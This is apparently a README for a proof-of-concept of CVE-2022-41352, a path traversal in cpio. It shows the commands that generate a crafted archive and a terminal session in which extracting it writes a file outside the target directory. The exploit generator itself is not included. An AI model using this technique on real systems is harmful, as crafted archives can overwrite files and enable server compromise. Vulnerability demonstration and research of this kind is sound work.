# cve-2022-41352

# generate poc.tar
```
$ chmod +x cpio_pocgen.py
$ ./cpio_pocgen.py
```

# show the middle finger to cpio
```
$ cd /tmp
$ mkdir -p poc/a/b

copy poc.tar to /tmp/poc/a/b/

$ cd /tmp/poc/a/b/
$ cpio -i < poc.tar
$ ls -al ../
total 16
drwxrwxr-x 3 xabino xabino 4096 ott 10 14:56 .
drwxrwxr-x 3 xabino xabino 4096 ott 10 14:55 ..
drwxrwxr-x 2 xabino xabino 4096 ott 10 14:56 b
-rw-r--r-- 1 xabino xabino   35 ott 10 14:56 here.txt <-- resource outside of /tmp/poc/a/b/

$ cat ../here.txt
I should not be here - by segfault
```
